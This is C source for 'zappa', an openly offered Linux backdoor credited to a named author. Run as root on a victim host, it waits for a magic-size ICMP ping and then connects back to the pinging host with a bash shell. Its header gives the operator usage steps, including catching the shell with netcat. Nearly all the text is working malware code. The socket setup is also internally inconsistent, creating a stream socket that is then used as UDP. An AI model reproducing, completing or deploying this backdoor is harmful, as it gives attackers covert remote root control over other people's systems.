/***************************************************************************
 * zappa v0.1beta - advanced backdoor (tested on linux 2.4.20)
 * written by Soeren Bleikertz, 2oo3
 * soeren@geekgate.org - http://www.sac.cc
 *
 * Description:
 * 'zappa' is an advanced backdoor, which doesn't listen on a TCP-port for
 * clients, further it waits for a special ICMP-packet and then it 'connects'
 * to an UDP-server on the 'client'.
 *
 * manual:
 * Start the backdoor with UID(0) on the target host and start a UDP-server on
 * port <PORT> on your host. Use 'nc -ulp <PORT>' for it. Ping the host with the
 * flags -c 1 -s <PKT_SIZE>. The backdoor will create a connection to your
 * UDP-server and you can type in your commands.
 *
 * TODO:
 * - hide raw-socket
 * - BSD-compatible
 *
 ****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

//CONFIG
#define PORT 		%PORT% //53 would be a nice value
#define PKT_SIZE 	100 // ping -s <PKT_SIZE>
#define SHELL 		"/bin/bash"
#define TIMEOUT 	20 //seconds
#define BUFF_SIZE 	2048 //bytes
//EOC

#define BAN_WELCOME 	"evil backd00r - Have a lot of fun..\\n" //change this :>
#define BAN_BYE 	"Have a nice day..\\n"

//SIGCHLD-handler
void sig_chld(int signo)
{
	pid_t pid;
	int s;
	while ((pid = waitpid(-1, &s, WNOHANG)) > 0)
		return;
}

//UDP-based and passive backdoor
int backdoor(u_int32_t saddr)
{
	struct sockaddr_in cli;
	struct in_addr chkaddr;
	//fd: child--write-->parent, //fd2: parent--write-->child
	int sock, sock_b, pipe_b, fd[2], fd2[2], highfd;
	char buffer[BUFF_SIZE];
	socklen_t len;
	pid_t pid;
	fd_set readfds;
	struct timeval tout; //timeout

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		#ifdef DEBUG
			perror("socket() failed");
		#endif
		return -1;
	}

	cli.sin_addr.s_addr = chkaddr.s_addr = saddr;
	cli.sin_port = htons(PORT);
	cli.sin_family = AF_INET;
	len = sizeof(cli);

	FD_ZERO(&readfds);

	sendto(sock, BAN_WELCOME, sizeof(BAN_WELCOME), 0,
		(struct sockaddr*)&cli, len);
	#ifdef DEBUG
		printf("send banner.\\n");
	#endif

	if ((pipe(fd) == -1) || (pipe(fd2) == -1)) {
		#ifdef DEBUG
			perror("pipe() failed");
		#endif
		return -1;
	}
	//child
	if ((pid=fork()) == 0) {
			close(fd[0]); //close read-pipe
			close(fd2[1]); //close write-pipe
			//redirect I/O
			dup2(fd2[0], 0);
			dup2(fd[1], 1);
			dup2(fd[1], 2);
			execl(SHELL, SHELL, NULL); //start shell
			close(fd[1]);
			close(fd2[0]);
			exit(0);
	}
	//parent
	else if (pid > 0) {
		close(fd[1]); //close write-pipe
		close(fd2[0]); //close read-pipe

		fcntl(sock, F_SETFL, O_NONBLOCK);
		fcntl(fd[0], F_SETFL, O_NONBLOCK);

		highfd = (sock > fd[0]) ?sock :fd[0];

		#ifdef DEBUG
			printf("select()...\\n");
		#endif
		while(1) {
			FD_SET(sock,&readfds);
			FD_SET(fd[0],&readfds);

			bzero(buffer, sizeof(buffer));

			tout.tv_sec = TIMEOUT;
			tout.tv_usec = 0;

			select(highfd+1, &readfds,NULL,NULL,&tout);

			sock_b = recvfrom(sock, buffer, sizeof(buffer), 0,
				(struct sockaddr*)&cli, &len);
			pipe_b = read(fd[0], buffer, sizeof(buffer));

			if (sock_b > 0) {
				#ifdef DEBUG
					printf("sock: %s\\n", buffer);
				#endif
				//verify src-addr
				if (chkaddr.s_addr != cli.sin_addr.s_addr)
					continue;
				write(fd2[1], buffer, sock_b);
			}

			if (pipe_b > 0) {
				buffer[pipe_b] = 0;
				#ifdef DEBUG
					printf("pipe: %s\\n", buffer);
				#endif
				sendto(sock, buffer, pipe_b, 0,
					(struct sockaddr*)&cli, len);
			}

			if ((!pipe_b) || (!sock_b))
				break;
		}
		close(fd[0]); //close pipe
		close(fd2[1]); //close pipe
		sendto(sock, BAN_BYE, sizeof(BAN_BYE), 0,
			(struct sockaddr*)&cli, len);
		close(sock); //close socket
	}
	else {
		#ifdef DEBUG
			perror("fork() failed");
		#endif
		return -1;
	}

	return 0;
}

//icmp-watchd
int main (int argc, char **argv)
{
	int sock, recvb;
	char buff[1024];
	struct icmphdr *icmph;
	struct iphdr *iph;

	signal(SIGCHLD,sig_chld);

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
		#ifdef DEBUG
			perror("socket() failed"); //debug
		#endif
		exit(-1);
	}

	iph = (struct iphdr*) buff;
	icmph = (struct icmphdr*) (buff + sizeof(*iph));

	#ifdef DEBUG
		printf("ICMP-WatchD...\\n");
	#endif
	while ((recvb = recv(sock, buff, sizeof(buff), 0)) > 0) {
		//is it our magic packet?
		if ((icmph->type == ICMP_ECHO)
		&& (recvb == PKT_SIZE+sizeof(*iph)+sizeof(*icmph))) {
			backdoor(iph->saddr);
		}
	}

	return 0;
}

